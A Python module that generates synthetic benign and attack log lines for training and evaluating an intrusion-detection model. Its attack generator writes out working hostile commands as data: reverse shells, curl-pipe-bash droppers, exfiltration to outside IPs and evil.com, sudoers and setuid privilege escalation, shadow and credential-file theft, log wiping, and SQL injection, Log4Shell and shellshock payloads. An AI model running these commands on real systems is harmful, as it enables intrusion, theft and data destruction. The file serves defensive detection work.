"""
Synthetic RAW log-line generators for training and evaluating the raw-log model.

Two corpora:
  * benign_logs()  — the ordinary system-log families a Linux host emits all day
    (journald systemd/kernel/session, sshd auth, cron, apache access, dpkg/apt,
    NetworkManager, WSL). These are what the model must learn to treat as NORMAL,
    even though every line is textually a bit different.
  * attack_logs()  — raw lines describing real intrusion behaviour with NO Wazuh
    rule attached (reverse shells, web exploitation, SSH brute force from public
    IPs, privilege escalation, credential theft, data exfil, log tampering). These
    are the positive class the content model learns to separate — and the held-out
    set the evaluation measures recall on.

Everything is wrapped in the archives.json shape ({"full_log","location",...}) so
it flows through templatize()/log_features.extract() exactly like a real event.
Randomised hosts/IPs/pids keep each line distinct, mirroring production churn.
"""

import random

_HOSTS = ["LAPTOP-M9GQ2F87", "web-prod-01", "db-node-2", "gw-edge"]
_USERS = ["sek", "diana", "root", "www-data", "postgres", "deploy", "backup"]
_INT_IPS = ["192.168.1.10", "192.168.1.22", "10.0.0.50", "10.0.0.100", "172.17.0.3"]
_EXT_IPS = ["203.0.113.9", "45.9.148.22", "185.220.101.7", "89.248.165.44",
            "193.32.162.11", "141.98.10.63", "80.94.92.20"]
_MONTHS = ["Jan", "Feb", "Mar", "Apr", "May", "Jun",
           "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]


def _ts():
    return f"{random.choice(_MONTHS)} {random.randint(1,28):2d} " \
           f"{random.randint(0,23):02d}:{random.randint(0,59):02d}:{random.randint(0,59):02d}"


def _pid():
    return random.randint(300, 999999)


def _ev(full, location, level=0, groups=None):
    ev = {"full_log": full, "location": location,
          "decoder": {"name": location.split()[0] if location else "unknown"}}
    if level:
        ev["rule"] = {"level": level, "groups": groups or []}
    return ev


# --------------------------------------------------------------------------- #
#  BENIGN system-log families
# --------------------------------------------------------------------------- #
def _benign_line():
    h = random.choice(_HOSTS)
    u = random.choice(_USERS)
    pid = _pid()
    kind = random.choices(
        ["systemd", "kernel", "session", "sshd_ok", "cron", "apache_ok",
         "dpkg", "networkmanager", "wsl", "sudo_cmd", "systemd_scope",
         "cmd_output", "devops"],
        weights=[16, 10, 12, 8, 6, 10, 5, 5, 4, 12, 14, 12, 10])[0]

    if kind == "devops":
        # Benign build/deploy activity — the HARD negatives: legitimately combines
        # fetch + chmod +x + run-script, superficially resembling a dropper, so the
        # model must learn intent (localhost/known hosts, no external C2) not verbs.
        cmd = random.choice([
            "git -C /srv/app pull --rebase && ./scripts/build.sh",
            "git pull && chmod +x ./deploy.sh && ./deploy.sh --env prod",
            "curl -fsS https://api.internal/health && systemctl reload nginx",
            "docker build -t app:latest . && docker compose up -d",
            "make -j4 && chmod +x ./bin/server && ./bin/server --check",
            "wget -q https://mirror.example.com/pkg-{n}.tar.gz -O /srv/pkg.tar.gz".format(n=random.randint(1,9)),
            "npm ci && npm run build && chmod +x dist/cli.js",
            "pip install -r requirements.txt && python manage.py migrate",
        ])
        return _ev(f"{_ts()} {h} bash[{pid}]: {u} : {cmd}", "journald", 3)

    if kind == "cmd_output":
        # Periodic `<log_format>command` inventory snapshots (df/netstat/ps/last).
        # These print tabular output whose numbers/columns change every run — the
        # exact class that reads as "novel and structurally odd" but is routine.
        which = random.choice(["df -P", "netstat listening ports", "last -n 20",
                               "ps aux (top mem)"])
        if which == "df -P":
            body = (f"Filesystem 1024-blocks Used Available Capacity Mounted on\n"
                    f"none {random.randint(10**7,2*10**7)} {random.randint(0,10**7)} "
                    f"{random.randint(10**6,10**7)} {random.randint(0,90)}% /usr/lib/modules")
        elif which == "netstat listening ports":
            body = (f"udp6 0 0 ::1:{random.randint(1,999)} :::* {random.randint(100,9999)}/"
                    f"{random.choice(['chronyd','systemd-resolve','sshd'])}")
        elif which == "last -n 20":
            body = (f"{random.choice(_USERS)} pts/{random.randint(0,5)} {random.choice(_INT_IPS)} "
                    f"{_ts()} still logged in")
        else:
            body = (f"root {random.randint(1,9999)} 0.{random.randint(0,9)} "
                    f"{random.randint(1,20)}.{random.randint(0,9)} {random.randint(10**5,10**6)} "
                    f"/usr/sbin/{random.choice(['wazuh-analysisd','sshd','cron'])}")
        return _ev(f"ossec: output: '{which}':\n{body}", which, 7)

    if kind == "systemd":
        unit = random.choice(["docker.service", "cron.service", "ssh.service",
                              "systemd-tmpfiles-clean.service", "snapd.service",
                              "man-db.service", "apt-daily.service"])
        act = random.choice(["Started", "Stopping", "Stopped", "Starting",
                             "Reloading", "Finished", "Succeeded."])
        return _ev(f"{_ts()} {h} systemd[1]: {act} {unit}.", "journald", 3)

    if kind == "systemd_scope":
        cid = "%032x" % random.randrange(16**32)
        act = random.choice([
            f"docker-{cid}.scope: Deactivated successfully.",
            f"docker-{cid}.scope: Consumed {random.randint(1,30)}.{random.randint(0,999):03d}s "
            f"CPU time, {random.randint(1,4)}G memory peak, {random.randint(100,900)}k read from disk.",
            f"Started docker-{cid}.scope - libcontainer container {cid}.",
        ])
        return _ev(f"{_ts()} {h} systemd[1]: {act}", "journald", 3)

    if kind == "kernel":
        msg = random.choice([
            f"hv_utils: TimeSync IC version {random.randint(3,4)}.0",
            f"misc dxg: dxgk: dxgkio_create_allocation: Ioctl failed: -{random.randint(1,90)}",
            f"audit: type=1400 audit({random.randint(10**9,2*10**9)}.{random.randint(100,999)}:{_pid()}): "
            f"apparmor=\"STATUS\" operation=\"profile_load\"",
            f"TCP: request_sock_TCP: Possible SYN flooding on port {random.randint(1,9999)}.",
            f"EXT4-fs (sda1): mounted filesystem with ordered data mode.",
        ])
        return _ev(f"{_ts()} {h} kernel: {msg}", "journald", random.choice([2, 3]))

    if kind == "session":
        svc = random.choice(["sudo", "cron", "sshd", "systemd-user"])
        act = random.choice([
            f"pam_unix({svc}:session): session opened for user root(uid=0) by (uid=1000)",
            f"pam_unix({svc}:session): session closed for user root",
            f"pam_unix({svc}:session): session opened for user {u}(uid={random.randint(1000,1010)})",
        ])
        return _ev(f"{_ts()} {h} {svc}[{pid}]: {act}", "journald", 3)

    if kind == "sshd_ok":
        ip = random.choice(_INT_IPS)
        act = random.choice([
            f"Accepted publickey for {u} from {ip} port {random.randint(30000,60000)} ssh2: "
            f"ED25519 SHA256:{'%044x' % random.randrange(16**40)}",
            f"Accepted password for {u} from {ip} port {random.randint(30000,60000)} ssh2",
            f"pam_unix(sshd:session): session opened for user {u}",
        ])
        return _ev(f"{_ts()} {h} sshd[{pid}]: {act}", "/var/log/auth.log", 3)

    if kind == "cron":
        cmd = random.choice(["cd / && run-parts /etc/cron.hourly",
                             "/usr/bin/certbot renew --quiet",
                             "test -x /usr/sbin/anacron || ( cd / && run-parts /etc/cron.daily )"])
        return _ev(f"{_ts()} {h} CRON[{pid}]: ({u}) CMD ({cmd})", "journald", 3)

    if kind == "apache_ok":
        ip = random.choice(_INT_IPS + _EXT_IPS)
        page = random.choice(["/", "/index.html", "/about", "/blog/", "/contact",
                             "/wp-json/wp/v2/posts", "/style.css", "/favicon.ico",
                             "/api/status", "/products", "/sitemap.xml"])
        code = random.choice([200, 200, 200, 304, 301, 404])
        return _ev(f'{ip} - - [{_ts()}] "GET {page} HTTP/1.1" {code} {random.randint(100,9000)} '
                   f'"-" "Mozilla/5.0"', "apache", 0)

    if kind == "dpkg":
        pkg = random.choice(["libc6:amd64", "openssl", "curl", "python3.11",
                            "nginx-common", "ca-certificates"])
        act = random.choice(["status installed", "status half-configured",
                            "status unpacked", "configure"])
        return _ev(f"{_ts()} {h} dpkg: {act} {pkg} {random.randint(1,9)}."
                   f"{random.randint(0,40)}.{random.randint(0,20)}", "dpkg", 0)

    if kind == "networkmanager":
        return _ev(f"{_ts()} {h} NetworkManager[{pid}]: <info>  "
                   f"[{random.randint(10**9,2*10**9)}.{random.randint(1000,9999)}] "
                   f"dhcp4 (eth0): lease time {random.randint(3000,86400)}", "journald", 3)

    if kind == "wsl":
        return _ev(f"{_ts()} {h} unknown: WSL ({random.randint(100,999)}) "
                   f"ERROR: CheckConnection: getaddrinfo() failed: -{random.randint(2,5)}",
                   "journald", 2)

    # sudo_cmd — the exact class that used to false-positive. Includes HARD
    # negatives: benign admin commands that contain attack-term tokens (curl,
    # wget, find, chmod +x) used legitimately, so the model learns context rather
    # than blanket-flagging those verbs.
    cmd = random.choice([
        "/usr/bin/systemctl restart wazuh-manager",
        "/usr/bin/apt-get update && apt-get -y upgrade",
        "/usr/bin/pkill -9 -f 'python wsgi.py'",
        "/usr/bin/docker compose up -d",
        "/usr/bin/tail -n 200 /var/log/syslog",
        "/usr/bin/nano /etc/ossec.conf",
        "/bin/journalctl -u ssh --since today",
        "/usr/bin/curl -s http://localhost:5000/health",
        "/usr/bin/wget https://github.com/wazuh/wazuh/archive/refs/tags/v4.9.tar.gz",
        "/usr/bin/find /home/{u}/wazuh -name '*.log' -mtime +7 -delete".format(u=u),
        "/usr/bin/chmod +x /home/{u}/deploy.sh".format(u=u),
        "/usr/bin/git -C /home/{u}/wazuh pull --rebase".format(u=u),
        "/usr/bin/grep -r 'ERROR' /var/log/ossec",
        "/usr/bin/rsync -az /home/{u}/backup/ /mnt/backup/".format(u=u),
    ])
    return _ev(f"{_ts()} {h} sudo[{pid}]:   {u} : PWD=/home/{u}/work ; "
               f"USER=root ; COMMAND={cmd}", "journald", 3)


# --------------------------------------------------------------------------- #
#  ATTACK families (raw lines, no rule attached)
# --------------------------------------------------------------------------- #
def _attack_line():
    h = random.choice(_HOSTS)
    ip = random.choice(_EXT_IPS)
    pid = _pid()
    kind = random.choice([
        "revshell", "web_exploit", "ssh_brute", "privesc", "cred_theft",
        "exfil", "malware_dl", "log_tamper", "recon", "webshell"])

    if kind == "revshell":
        p = random.randint(1024, 65535)
        payload = random.choice([
            f"bash -i >& /dev/tcp/{ip}/{p} 0>&1",
            f"nc -e /bin/sh {ip} {p}",
            f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{p}));"
            f"os.dup2(s.fileno(),0);pty.spawn(\"/bin/bash\")'",
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {p} >/tmp/f",
        ])
        return _ev(f"{_ts()} {h} bash[{pid}]: {payload}", "/var/log/auth.log")

    if kind == "web_exploit":
        path = random.choice([
            "/index.php?page=../../../../etc/passwd",
            "/download?file=../../../../../etc/passwd%00.jpg",
            "/login.php?user=admin'--&pass=x",
            "/search?q=1' UNION SELECT username,password FROM users--",
            "/item?id=1 UNION ALL SELECT NULL,@@version,information_schema.tables--",
            "/api?id=1' AND SLEEP(5)-- -",
            "/api/v1/user?id=1;DROP TABLE users",
            "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/?cmd=cat%20/etc/passwd",
            "/?x=${jndi:ldap://%s:1389/Exploit}" % ip,
            "/cgi-bin/status",  # shellshock lands in UA below
        ])
        ua = random.choice(["sqlmap/1.7", "Nikto/2.5", "() { :;}; /bin/bash -c 'id'",
                            "${jndi:ldap://%s/a}" % ip, "Mozilla/5.0 zgrab"])
        return _ev(f'{ip} - - [{_ts()}] "GET {path} HTTP/1.1" 200 '
                   f'{random.randint(100,9000)} "-" "{ua}"', "apache")

    if kind == "ssh_brute":
        u = random.choice(["admin", "root", "oracle", "test", "postgres", "ubuntu"])
        return _ev(f"{_ts()} {h} sshd[{pid}]: Failed password for "
                   f"{'invalid user ' if random.random()<0.5 else ''}{u} from {ip} "
                   f"port {random.randint(30000,60000)} ssh2", "/var/log/auth.log")

    if kind == "privesc":
        payload = random.choice([
            "chmod u+s /bin/bash",
            "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash",
            "echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
            "usermod -aG sudo attacker",
            "pkexec --version; GCONV_PATH=./ pkexec /bin/sh  # pwnkit CVE-2021-4034",
            "sudo -u#-1 /bin/bash  # CVE-2019-14287",
            "find / -perm -4000 -exec {} \\;",
        ])
        return _ev(f"{_ts()} {h} bash[{pid}]: {random.choice(_USERS)} : {payload}",
                   "/var/log/auth.log")

    if kind == "cred_theft":
        payload = random.choice([
            "cat /etc/shadow", "cp /etc/shadow /tmp/.s", "cat /etc/gshadow",
            "cat ~/.ssh/id_rsa", "grep -r password /var/www",
            "cat /root/.aws/credentials ~/.kube/config ~/.git-credentials",
            "gcore -o /tmp/d $(pgrep lsass)", "mimikatz sekurlsa::logonpasswords",
        ])
        return _ev(f"{_ts()} {h} bash[{pid}]: {payload}", "/var/log/auth.log")

    if kind == "exfil":
        payload = random.choice([
            f"tar czf - /var/www | nc {ip} 443",
            f"curl -X POST -F 'f=@/etc/passwd' http://{ip}/upload",
            f"scp -r /home/sek/secrets attacker@{ip}:/tmp/",
            f"dd if=/dev/sda | ssh attacker@{ip} 'dd of=/tmp/disk.img'",
            "for f in /etc/*; do dig +short $(base64 -w0 $f).tunnel.evil.com; done",
            f"gzip -c /var/log/wtmp | openssl enc -aes-256-cbc -k p | curl -T - http://{ip}/x",
        ])
        return _ev(f"{_ts()} {h} bash[{pid}]: {payload}", "journald")

    if kind == "malware_dl":
        payload = random.choice([
            f"wget http://{ip}/x.sh -O /tmp/x.sh && chmod +x /tmp/x.sh && /tmp/x.sh",
            f"curl -s http://{ip}/miner | bash",
            f"certutil -urlcache -f http://{ip}/a.exe a.exe",
            f"python3 -c \"import urllib.request;exec(urllib.request.urlopen('http://{ip}/p').read())\"",
        ])
        return _ev(f"{_ts()} {h} bash[{pid}]: {payload}", "journald")

    if kind == "log_tamper":
        payload = random.choice([
            "echo > /var/log/auth.log", "rm -rf /var/log/*.log",
            "history -c && rm ~/.bash_history",
            "shred -u /var/ossec/logs/alerts/alerts.json",
        ])
        return _ev(f"{_ts()} {h} bash[{pid}]: {payload}", "journald")

    if kind == "recon":
        payload = random.choice([
            f"nmap -sS -p- {random.choice(_INT_IPS)}",
            "cat /etc/passwd | cut -d: -f1",
            "find / -perm -4000 2>/dev/null",
            "netstat -tulpn; ss -tulpn; ps aux",
        ])
        return _ev(f"{_ts()} {h} bash[{pid}]: {payload}", "journald")

    # webshell
    path = random.choice(["/uploads/shell.php", "/images/cmd.php", "/tmp/.hidden.php"])
    return _ev(f'{ip} - - [{_ts()}] "POST {path}?c=id HTTP/1.1" 200 '
               f'{random.randint(10,300)} "-" "curl/7.88"', "apache")


def benign_logs(n=6000, seed=42):
    random.seed(seed)
    return [_benign_line() for _ in range(n)]


def attack_logs(n=1500, seed=1337):
    random.seed(seed)
    return [_attack_line() for _ in range(n)]


if __name__ == "__main__":
    for ev in benign_logs(3, 1) + attack_logs(3, 1):
        print(ev["location"], "::", ev["full_log"][:90])
